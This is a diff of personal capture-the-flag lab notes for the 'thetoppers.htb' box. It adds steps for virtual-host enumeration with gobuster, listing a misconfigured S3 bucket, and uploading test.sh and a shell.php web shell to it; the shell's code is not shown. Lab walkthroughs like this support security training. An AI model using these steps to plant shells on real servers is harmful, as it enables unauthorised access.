@@ -4,12 +4,21 @@ ip=10.129.227.248
 
 ![d2fdcc6d25130d8c240c32c34cc88182.png](../_resources/d2fdcc6d25130d8c240c32c34cc88182.png)
 
+
+
+
 # 2.Thetoppers.htb connect
+
+**http://$ip/#contact**
+
+![a06297cc4c378bf0bdc1d3086dfef1ee.png](../_resources/a06297cc4c378bf0bdc1d3086dfef1ee.png)
+
+
 `sudo vim /etc/hosts`
 
-![698845054e5d64c7e39a02f5ddfced02.png](../_resources/698845054e5d64c7e39a02f5ddfced02.png)
+![d147ea4f9870238913393c1061383b89.png](../_resources/d147ea4f9870238913393c1061383b89.png)
 
-# 3 SubDirectory Search
+# 3 Directory Enumeration
 `gobuster vhost -w /home/kali/Three/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb` 
 
 # 4 AWS Service
@@ -22,10 +31,15 @@ ip=10.129.227.248
 
 ![4c7551d9f3c27222ada7ea4551fc8e3a.png](../_resources/4c7551d9f3c27222ada7ea4551fc8e3a.png)
 
-## use sh
+## aws ls
+`aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
+
+![812a2beaf4ad8796f788ace6a3235e6c.png](../_resources/812a2beaf4ad8796f788ace6a3235e6c.png)
+
+## use test.sh
 `aws --endpoint=http://s3.thetoppers.htb s3 cp test.sh s3://thetoppers.htb`
 
-## use php
+## use shell.php
 `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb` 
 
 ![f18a34dc541f070b1b36276997d79d88.png](../_resources/f18a34dc541f070b1b36276997d79d88.png)
